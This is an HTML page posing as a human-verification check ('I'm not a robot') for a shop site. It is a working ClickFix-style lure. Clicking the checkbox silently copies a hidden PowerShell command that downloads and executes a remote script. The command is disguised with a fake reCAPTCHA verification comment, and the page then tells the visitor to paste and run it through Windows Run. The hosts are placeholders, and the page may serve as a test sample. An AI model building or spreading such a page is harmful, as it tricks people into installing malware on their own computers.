<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Just a moment...</title>
    <style>
      body { font-family: system-ui, sans-serif; background: #f2f2f2; }
      .box { margin: 80px auto; width: 320px; background: #fff; border: 1px solid #ddd; padding: 18px; }
      #steps { display: none; margin-top: 12px; }
    </style>
  </head>
  <body>
    <h1>example-shop.invalid</h1>
    <p>Verify you are human by completing the action below.</p>
    <div class="box">
      <label id="verify"><input type="checkbox" id="cb" /> I'm not a robot</label>
      <div id="steps">Verification steps: 1. Press Windows Key + R 2. Press CTRL + V 3. Press Enter</div>
    </div>
    <script>
      const payload = 'powershell -w h -c "iwr https://cdn.example.invalid/v.ps1 | iex" # ✅ I am not a robot - reCAPTCHA Verification ID: 4821';
      document.getElementById('cb').addEventListener('click', async () => {
        document.getElementById('steps').style.display = 'block';
        try {
          await navigator.clipboard.writeText(payload);
          document.title = 'written';
        } catch (e) {
          document.title = 'error ' + e;
        }
      });
    </script>
  </body>
</html>
